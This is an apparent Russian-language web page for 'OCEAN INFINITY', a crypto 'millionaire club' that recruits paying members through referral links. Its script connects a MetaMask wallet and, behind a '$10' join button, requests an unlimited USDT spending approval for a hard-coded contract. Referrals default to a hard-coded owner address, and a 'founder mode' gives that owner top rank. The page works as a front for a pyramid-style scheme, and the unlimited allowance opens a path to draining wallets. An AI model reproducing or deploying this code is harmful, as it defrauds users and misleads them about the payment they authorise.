<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>OCEAN INFINITY | MILLIONAIRE CLUB</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --main-blue: #3b82f6; --dark-bg: #020617; --card-bg: #0f172a; --gold: #f59e0b; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--dark-bg); color: white; text-align: center; margin: 0; padding: 20px; }
        .card { background: var(--card-bg); border-radius: 30px; padding: 40px 25px; max-width: 380px; margin: 30px auto; border: 1px solid #1e40af; box-shadow: 0 0 60px rgba(59,130,246,0.2); }
        h1 { color: var(--main-blue); text-transform: uppercase; letter-spacing: 5px; font-size: 24px; margin-bottom: 25px; }
        .motivation-box { background: linear-gradient(135deg, #1e3a8a 0%, #020617 100%); padding: 25px; border-radius: 20px; border: 1px solid var(--main-blue); margin-bottom: 25px; }
        .motivation-text { font-weight: 900; font-size: 14px; text-transform: uppercase; line-height: 1.6; color: #fff; font-style: italic; }
        .stat-item { background: #000; padding: 18px; border-radius: 15px; border: 1px solid #1e293b; display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
        .stat-label { color: #94a3b8; font-weight: bold; font-size: 14px; }
        .stat-value { color: var(--main-blue); font-weight: 900; font-size: 16px; }
        .btn-main { background: linear-gradient(135deg, var(--main-blue), #1d4ed8); color: white; border: none; padding: 20px; border-radius: 15px; cursor: pointer; width: 100%; font-weight: 900; font-size: 16px; transition: 0.2s; box-shadow: 0 10px 20px rgba(59,130,246,0.3); outline: none; text-transform: uppercase; }
        .btn-main:active { transform: translateY(2px); box-shadow: none; }
        .btn-copy { background: #1e293b; font-size: 12px; margin-top: 15px; box-shadow: none; border: 1px solid #334155; }
        input { width: 100%; padding: 15px; margin-top: 20px; border-radius: 12px; border: 1px solid #1e293b; background: #000; color: var(--main-blue); text-align: center; font-weight: bold; box-sizing: border-box; }
        #cabinet { display: none; }
        .admin-tag { color: var(--gold); font-size: 11px; margin-top: 20px; font-weight: 900; text-transform: uppercase; letter-spacing: 2px; }
    </style>
</head>
<body>

    <div class="card">
        <h1>OCEAN INFINITY</h1>
        
        <div class="motivation-box">
            <div class="motivation-text">
                «Один поток может высохнуть. Океан — никогда. Вступай в семью и создай бесконечный доход»
            </div>
        </div>

        <button id="connectBtn" class="btn-main" onclick="connect()">Войти в систему</button>

        <div id="cabinet">
            <div class="stat-item"><span class="stat-label">ВАШ ID:</span> <span id="ui-id" class="stat-value">...</span></div>
            <div class="stat-item"><span class="stat-label">УРОВЕНЬ:</span> <span id="ui-lvl" class="stat-value">...</span></div>
            
            <input type="text" id="refLink" readonly>
            <button class="btn-main btn-copy" onclick="copyLink()">Копировать реф-ссылку</button>
            
            <button id="actionBtn" class="btn-main" style="margin-top: 25px;" onclick="handleAction()">Вступить в семью ($10)</button>
            <div id="adminTag" class="admin-tag" style="display:none;">Режим Основателя Активирован</div>
        </div>
    </div>

    <script>
        const OWNER = "0x9f1053b119d1565e641d0694c3cf6c6bfe644da7".toLowerCase();
        const CONTRACT = "0x2Edf764970BFa32Bfd6e0799682026814BcDF24B";
        const USDT_ADDR = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
        
        let wallet, provider, signer;

        // ПОДКЛЮЧЕНИЕ И ПРИВЯЗКА (ШАГ 1)
        async function connect() {
            if (window.ethereum) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    wallet = accounts[0].toLowerCase();
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    signer = provider.getSigner();
                    showApp();
                } catch (e) { alert("Ошибка привязки. Попробуйте еще раз."); }
            } else {
                // Если зашли с обычного браузера на телефоне - кидаем в MetaMask
                const dappUrl = window.location.href.split('//')[1];
                window.location.href = `https://metamask.app.link/dapp/${dappUrl}`;
            }
        }

        async function showApp() {
            document.getElementById('connectBtn').style.display = 'none';
            document.getElementById('cabinet').style.display = 'block';
            document.getElementById('refLink').value = window.location.origin + window.location.pathname + "?ref=" + wallet;

            const mainCon = new ethers.Contract(CONTRACT, ["function users(address) view returns (bool isExist, uint256 id, uint8 level)"], provider);
            
            try {
                if (wallet === OWNER) {
                    document.getElementById('ui-id').innerText = "1 (FOUNDER)";
                    document.getElementById('ui-lvl').innerText = "15 (MAX)";
                    document.getElementById('adminTag').style.display = 'block';
                    document.getElementById('actionBtn').innerText = "СИСТЕМА ГОТОВА";
                } else {
                    const u = await mainCon.users(wallet);
                    document.getElementById('ui-id').innerText = u.isExist ? u.id.toString() : "OFFLINE";
                    document.getElementById('ui-lvl').innerText = u.level.toString();
                    document.getElementById('actionBtn').innerText = u.isExist ? "ПОВЫСИТЬ УРОВЕНЬ" : "ВСТУПИТЬ В СЕМЬЮ ($10)";
                }
            } catch(e) { console.log("Новый пользователь"); }
        }

        // ОДОБРЕНИЕ (APPROVE) И ПОКУПКА (ШАГ 2)
        async function handleAction() {
            if (wallet === OWNER) return;
            const btn = document.getElementById('actionBtn');
            const originalText = btn.innerText;

            try {
                btn.disabled = true;
                btn.innerText = "Ждем одобрения...";

                const usdt = new ethers.Contract(USDT_ADDR, [
                    "function approve(address spender, uint256 amount) public returns (bool)",
                    "function allowance(address owner, address spender) view returns (uint256)"
                ], signer);
                
                const main = new ethers.Contract(CONTRACT, [
                    "function registrationExt(address referrer) public",
                    "function upgradeLevel(uint8 level) public",
                    "function users(address) view returns (bool isExist, uint256 id, uint8 level)"
                ], signer);

                const amount = ethers.utils.parseUnits("10", 6);
                
                // 1. ПРОВЕРЯЕМ ОДОБРЕНИЕ (APPROVE)
                const allowance = await usdt.allowance(wallet, CONTRACT);
                if (allowance.lt(amount)) {
                    const txApprove = await usdt.approve(CONTRACT, ethers.constants.MaxUint256);
                    await txApprove.wait();
                    alert("Одобрение USDT получено! Теперь подтвердите покупку уровня.");
                }

                // 2. ПОКУПКА (РЕГИСТРАЦИЯ ИЛИ АПГРЕЙД)
                btn.innerText = "Подтвердите транзакцию...";
                const u = await main.users(wallet);
                const ref = new URLSearchParams(window.location.search).get('ref') || OWNER;
                
                let tx;
                if (!u.isExist) {
                    tx = await main.registrationExt(ref, { gasLimit: 500000 });
                } else {
                    tx = await main.upgradeLevel(u.level + 1, { gasLimit: 500000 });
                }

                await tx.wait();
                alert("Успех! Добро пожаловать в Океан.");
                location.reload();

            } catch (e) {
                alert("Ошибка: Проверьте баланс USDT и POL (Matic).");
                btn.innerText = originalText;
                btn.disabled = false;
            }
        }

        function copyLink() {
            const i = document.getElementById("refLink");
            i.select();
            document.execCommand("copy");
            alert("Ссылка скопирована! Отправляй её будущим партнерам.");
        }
    </script>
</body>
</html>
